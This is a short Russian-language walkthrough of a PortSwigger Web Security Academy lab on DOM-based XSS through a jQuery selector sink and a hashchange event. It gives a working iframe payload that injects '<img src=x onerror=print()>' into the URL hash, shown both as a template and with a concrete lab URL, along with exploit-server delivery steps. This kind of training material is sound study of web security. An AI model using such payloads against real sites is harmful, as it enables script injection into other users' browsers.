зайдем в случайный пост и отправим тестовый комментарий
```
GET /post?postId=2
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/7.%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashchange%20event/pics%20for%20walktrough/1.png)

перейдем в `Exploit server`. В общем виде нащ эксплойт будет выглядеть как
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

наш же пэйлоад будет выглядеть как
```
<iframe src="https://0a4000a904f6f2dd80d712b6001d0066.web-security-academy.net//#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
`Store exploit`, `view exploit`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/7.%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashchange%20event/pics%20for%20walktrough/2.png)

и увидим, что получили pdf для печати записей блога

нажмем `Deliver to victim` и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/7.%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashchange%20event/pics%20for%20walktrough/3.png)
